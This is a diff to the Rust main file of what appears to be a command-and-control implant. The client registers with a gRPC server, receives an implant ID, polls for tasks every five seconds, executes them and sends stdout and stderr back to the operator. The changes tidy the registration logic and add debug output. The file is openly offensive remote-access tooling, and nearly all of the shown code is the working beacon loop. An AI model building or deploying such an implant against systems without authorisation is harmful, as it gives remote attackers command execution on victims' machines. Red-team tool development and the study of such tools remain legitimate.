@@ -3,45 +3,49 @@ mod exec;
 use std::error::Error;
 
 use exec::implantpb::implant_rpc_client::ImplantRpcClient;
-use exec::implantpb::{TaskRequest, TaskResult, Registration};
+use exec::implantpb::{Registration, TaskRequest, TaskResult};
 use tonic::transport::{Certificate, Channel, ClientTlsConfig};
 
 #[tokio::main]
 async fn main() {
     let mut client = make_client().await.unwrap();
-    let implant_id = uuid::Uuid::new_v4().to_string();
 
     let request = tonic::Request::new(Registration {
-        implant_id: "".to_string()
+        implant_id: "".to_string(),
     });
-    client.register(request).await.unwrap();
+    let implant_id = client
+        .register(request)
+        .await
+        .unwrap()
+        .into_inner()
+        .implant_id;
 
     loop {
         let request = tonic::Request::new(TaskRequest {
-            implant_id: implant_id.clone()
+            implant_id: implant_id.clone(),
         });
-        // let response = client.get_task(request).await.unwrap().into_inner();
+
         match client.get_task(request).await {
             Ok(response) => {
+                println!("{:?}", response);
                 let response = response.into_inner();
                 if let Some((stdout, stderr)) = exec::exec_task(&response) {
                     let request = tonic::Request::new(TaskResult {
                         id: response.task_id,
                         stdout,
-                        stderr
+                        stderr,
                     });
                     client.post_result(request).await.unwrap();
                 }
             }
-            Err(_) => ()
+            Err(e) => eprintln!("{:?}", e),
         }
-
 
         tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
     }
 }
 
-async fn make_client() -> Result<ImplantRpcClient<Channel>, Box<dyn Error>>{
+async fn make_client() -> Result<ImplantRpcClient<Channel>, Box<dyn Error>> {
     // TODO: Don't use a hardcoded ca cert
     let pem = tokio::fs::read("../certs/ca.pem").await?;
     let ca = Certificate::from_pem(pem);
